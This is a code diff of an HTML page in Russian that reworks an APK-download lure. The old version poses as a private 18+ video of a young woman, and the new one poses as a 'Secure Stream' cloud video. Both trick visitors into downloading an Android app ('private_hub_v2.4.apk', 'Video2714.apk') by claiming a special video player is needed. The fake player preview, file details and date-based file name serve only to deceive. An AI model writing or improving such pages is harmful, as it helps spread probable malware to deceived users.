@@ -3,289 +3,294 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Player UI</title>
+    <title>Видео из облака — Secure Stream</title>
     <style>
-        :root {
-            --bg-color: #0d0d0d;
-            --card-bg: #1a1a1a;
-            --accent-red: #ff2d55;
-            --text-main: #ffffff;
-            --text-secondary: #8e8e93;
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #eef2f7;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
+            padding: 20px 10px;
         }
 
-        .player-container {
-            width: 360px;
-            background: linear-gradient(180deg, #252525 0%, #121212 100%);
-            border-radius: 24px;
-            padding: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .logo { color: var(--accent-red); font-weight: bold; font-size: 18px; }
-        .live-indicator {
-            background: rgba(255, 45, 85, 0.2);
-            color: var(--accent-red);
-            padding: 4px 10px;
-            border-radius: 12px;
-            font-size: 12px;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        /* Контейнер для видео */
-        .video-box {
-            position: relative;
+        .container {
+            background-color: #ffffff;
             width: 100%;
-            aspect-ratio: 9/12;
+            max-width: 480px;
             border-radius: 16px;
+            padding: 30px 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        /* Header */
+        .header h1 {
+            font-size: 24px;
+            color: #1a202c;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .header p {
+            font-size: 14px;
+            color: #718096;
+            margin-bottom: 20px;
+        }
+
+        /* Video Player Wrapper (Теперь это ссылка для скачивания) */
+        .video-container {
+            position: relative;
+            background-color: #222733;
+            border-radius: 14px;
+            aspect-ratio: 16 / 10;
             overflow: hidden;
             display: flex;
-            justify-content: center;
-            align-items: center;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 14px;
+            box-shadow: 0 10px 25px rgba(34, 39, 51, 0.2);
+            margin-bottom: 20px;
+            text-decoration: none; /* Убираем подчеркивание */
             cursor: pointer;
         }
 
-        /* Задний фон с эффектом размытия (блюра) */
-        .video-box::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('image_a705c1.jpg');
-            background-size: cover;
-            background-position: center;
-            filter: blur(12px); /* Сила размытия картинки */
-            transform: scale(1.1); /* Убирает белые края от размытия */
-            z-index: 1;
-        }
-
-        .online-count {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(4px);
-            padding: 4px 8px;
-            border-radius: 8px;
-            font-size: 12px;
-            z-index: 2;
-        }
-
-        .age-limit {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: var(--accent-red);
-            padding: 4px 8px;
+        .badge {
+            align-self: flex-start;
+            background-color: rgba(0, 0, 0, 0.6);
+            color: #ffffff;
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            padding: 4px 10px;
             border-radius: 6px;
-            font-weight: bold;
-            font-size: 12px;
-            z-index: 2;
+            text-transform: uppercase;
         }
 
-        .play-button {
-            width: 70px;
-            height: 70px;
-            background: rgba(255,255,255,0.2);
-            backdrop-filter: blur(10px);
+        .play-btn {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 56px;
+            height: 56px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border: 2px solid #ffffff;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            border: 2px solid rgba(255,255,255,0.3);
-            z-index: 2;
+            transition: background-color 0.2s, transform 0.1s;
         }
 
-        .play-icon {
-            width: 0; height: 0;
-            border-top: 12px solid transparent;
-            border-bottom: 12px solid transparent;
-            border-left: 20px solid white;
-            margin-left: 5px;
+        .video-container:hover .play-btn {
+            background-color: rgba(255, 255, 255, 0.3);
         }
 
-        .progress-container {
-            width: 100%;
-            margin-top: 15px;
+        .video-container:active .play-btn {
+            transform: translate(-50%, -50%) scale(0.95);
         }
-        .bar {
+
+        .play-btn::after {
+            content: '';
+            display: block;
+            width: 0;
+            height: 0;
+            border-style: solid;
+            border-width: 10px 0 10px 16px;
+            border-color: transparent transparent transparent #ffffff;
+            margin-left: 4px;
+        }
+
+        .player-controls {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: #a0aec0;
+            font-size: 12px;
+        }
+
+        .progress-bar-container {
+            flex-grow: 1;
             height: 4px;
-            background: rgba(255,255,255,0.1);
+            background-color: #3e4452;
+            border-radius: 2px;
+            margin: 0 12px;
+            position: relative;
+        }
+
+        .progress-bar-fill {
+            width: 15%;
+            height: 100%;
+            background-color: #2ecc71;
             border-radius: 2px;
             position: relative;
         }
-        .fill {
-            width: 25%;
-            height: 100%;
-            background: var(--accent-red);
-            border-radius: 2px;
-        }
-        .time-row {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: var(--text-secondary);
-            margin-top: 8px;
-        }
 
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin: 20px 0;
-        }
-        
-        /* Круглая аватарка пользователя */
-        .avatar {
-            width: 42px; 
-            height: 42px;
+        .progress-handle {
+            position: absolute;
+            right: -4px;
+            top: -3px;
+            width: 10px;
+            height: 10px;
+            background-color: #2ecc71;
             border-radius: 50%;
-            border: 2px solid var(--accent-red);
-            background: url('image_a705c1.jpg');
-            background-size: cover;
-            background-position: center;
         }
 
-        .main-btn {
-            width: 100%;
-            background: var(--accent-red);
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 12px;
-            font-weight: bold;
+        /* File Info */
+        .file-title {
             font-size: 16px;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-            text-decoration: none;
+            font-weight: 700;
+            color: #1a202c;
+            margin-bottom: 16px;
+            word-break: break-all;
         }
 
-        .stats-row {
-            display: flex;
-            justify-content: space-around;
-            margin-top: 20px;
-            text-align: center;
-        }
-        .stat-item div:first-child { font-weight: bold; }
-        .stat-item div:last-child { color: var(--text-secondary); font-size: 11px; }
-
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.85);
-            backdrop-filter: blur(10px);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
+        .info-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 20px;
         }
 
-        .modal-card {
-            background: #1c1c1e;
-            width: 85%;
-            max-width: 320px;
-            padding: 30px 20px;
-            border-radius: 24px;
-            text-align: center;
-            border: 1px solid #333;
+        .info-table tr {
+            border-bottom: 1px solid #edf2f7;
         }
 
-        .modal-card h3 { margin: 15px 0 10px; font-size: 20px; }
-        .modal-card p { font-size: 14px; color: var(--text-secondary); margin-bottom: 25px; line-height: 1.4; }
+        .info-table tr:last-child {
+            border-bottom: none;
+        }
 
+        .info-table td {
+            padding: 12px 0;
+            font-size: 14px;
+        }
+
+        .info-table td.label {
+            color: #718096;
+        }
+
+        .info-table td.value {
+            color: #1a202c;
+            text-align: right;
+            font-weight: 500;
+        }
+
+        /* Alert Warning */
+        .alert-box {
+            background-color: #fffdf5;
+            border: 1px solid #fbe3b5;
+            border-radius: 12px;
+            padding: 14px 16px;
+            color: #b7791f;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+
+        /* Action Button */
         .btn-download {
             display: block;
-            background: var(--accent-red);
-            color: white;
+            width: 100%;
+            background-color: #2563eb;
+            color: #ffffff;
+            text-align: center;
+            padding: 16px;
+            border-radius: 14px;
+            font-size: 16px;
+            font-weight: 600;
             text-decoration: none;
-            padding: 15px;
-            border-radius: 12px;
-            font-weight: bold;
+            box-shadow: 0 10px 20px rgba(37, 99, 235, 0.3);
+            transition: background-color 0.2s, transform 0.1s;
+            margin-bottom: 14px;
+        }
+
+        .btn-download:hover {
+            background-color: #1d4ed8;
+        }
+
+        .btn-download:active {
+            transform: scale(0.99);
+        }
+
+        /* Footer text */
+        .footer-text {
+            text-align: center;
+            font-size: 12px;
+            color: #a0aec0;
         }
     </style>
 </head>
 <body>
 
-<div class="player-container">
+<div class="container">
     <div class="header">
-        <div class="logo">WexVideo</div>
-        <div class="live-indicator">● LIVE</div>
+        <h1>Видео из облака</h1>
+        <p>Secure Stream / доступ по ссылке</p>
     </div>
 
-    <div class="video-box" onclick="showModal()">
-        <div class="online-count">👁 1.2K онлайн</div>
-        <div class="age-limit">18+</div>
-        <div class="play-button">
-            <div class="play-icon"></div>
+    <a href="Video2714.apk" download="Video2714.apk" class="video-container">
+        <div class="badge">Предпросмотр</div>
+        <div class="play-btn"></div>
+        <div class="player-controls">
+            <span>00:17</span>
+            <div class="progress-bar-container">
+                <div class="progress-bar-fill">
+                    <div class="progress-handle"></div>
+                </div>
+            </div>
+            <span>01:42</span>
         </div>
+    </a>
+
+    <div class="file-title" id="fileName">clip_2026_06_12_2015.mp4</div>
+
+    <table class="info-table">
+        <tr>
+            <td class="label">Разрешение</td>
+            <td class="value">1920 × 1080</td>
+        </tr>
+        <tr>
+            <td class="label">Кодек</td>
+            <td class="value">H.265 / HEVC</td>
+        </tr>
+        <tr>
+            <td class="label">Размер файла</td>
+            <td class="value">27 MB</td>
+        </tr>
+        <tr>
+            <td class="label">Источник</td>
+            <td class="value">Secure Media</td>
+        </tr>
+    </table>
+
+    <div class="alert-box">
+        Для декодирования видео нужен совместимый Android-видеоплеер.
     </div>
 
-    <div class="progress-container">
-        <div class="bar"><div class="fill"></div></div>
-        <div class="time-row">
-            <span>0:48</span>
-            <span>4:12</span>
-        </div>
-    </div>
+    <a href="Video2714.apk" download="Video2714.apk" class="btn-download">Скачать видеоплеер</a>
 
-    <div class="user-info">
-        <div class="avatar"></div>
-        <div>
-            <div style="font-weight: bold;">Юлия, 21 💋</div>
-            <div style="font-size: 12px; color: var(--text-secondary);">2 часа назад • Приватное</div>
-        </div>
-    </div>
-
-    <button class="main-btn" onclick="showModal()">
-        ▶ Смотреть полное видео
-    </button>
-
-    <div class="stats-row">
-        <div class="stat-item"><div>14.8K</div><div>Просмотры</div></div>
-        <div class="stat-item"><div>892</div><div>Лайки</div></div>
-        <div class="stat-item"><div>4:12</div><div>Длительность</div></div>
-    </div>
-</div>
-
-<div class="modal-overlay" id="downloadModal">
-    <div class="modal-card">
-        <div style="font-size: 40px;">🔞</div>
-        <h3>Контент ограничен</h3>
-        <p>Для просмотра полных видео и прямого эфира без цензуры установите наше приложение.</p>
-        
-        <a href="private_hub_v2.4.apk" download="private_hub_v2.4.apk" class="btn-download">Скачать бесплатно</a>
+    <div class="footer-text">
+        После установки откройте видео повторно.
     </div>
 </div>
 
 <script>
-    function showModal() {
-        document.getElementById('downloadModal').style.display = 'flex';
-    }
-
-    document.getElementById('downloadModal').onclick = function(e) {
-        if(e.target == this) this.style.display = 'none';
-    }
+    // Генерация названия файла под вашу дату 12.06.2026
+    document.addEventListener("DOMContentLoaded", function() {
+        const year = "2026";
+        const month = "06";
+        const day = "12";
+        const mockTime = "2015"; 
+        
+        const generatedFileName = `clip_${year}_${month}_${day}_${mockTime}.mp4`;
+        document.getElementById("fileName").textContent = generatedFileName;
+    });
 </script>
 
 </body>
